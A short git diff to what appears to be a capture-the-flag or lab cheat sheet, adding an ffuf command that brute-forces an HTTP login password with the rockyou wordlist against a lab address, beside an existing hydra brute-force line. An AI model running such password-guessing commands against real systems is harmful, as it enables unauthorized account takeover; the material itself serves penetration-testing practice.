@@ -178,6 +178,14 @@ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.241.210 http-post-form 
 ```
 {% endcode %}
 
+### Bruteforcing Http Login using ffuf
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+ffuf -w /usr/share/wordlists/rockyou.txt  -d "email=adminaccount@itsupport.thm&password=FUZZ" -u http://10.10.8.153/login -fw 475 -H "Content-Type: application/x-www-form-urlencoded"
+```
+{% endcode %}
+
 ### Steganography
 
 <details>
